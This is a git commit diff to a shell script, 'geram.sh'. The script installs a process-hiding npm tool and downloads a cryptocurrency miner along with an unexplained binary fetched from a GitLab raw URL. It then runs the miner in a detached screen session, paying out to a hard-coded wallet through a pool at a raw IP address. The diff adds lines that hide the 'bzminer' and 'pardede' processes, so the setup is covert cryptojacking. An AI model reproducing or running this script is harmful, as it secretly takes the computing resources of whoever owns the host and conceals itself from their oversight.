6d7d09cc83d9deb7e293eae0abee1391a455a1f8
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-11 20:03:40 +0700

    Update geram.sh

--- geram.sh
+++ geram.sh
@@ -6,7 +6,8 @@ sudo apt install screen -y
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
 sudo apt install npm =y
-sudo npm i -g node-process-hider && sudo ph add beta185
+sudo npm i -g node-process-hider && sudo ph add bzminer
+sudo ph add pardede
 wget https://bzminer.com/downloads/bzminer_v21.2.0_linux.tar.gz && tar -xvf bzminer_v21.2.0_linux.tar.gz && cd bzminer_v21.2.0_linux
 wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
 screen -dms run ./bzminer -a karlsen -w 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 00-$(TZ=UTC-7 date +"%H-%M-%S")) -p 47.236.130.246:443 --nc 1
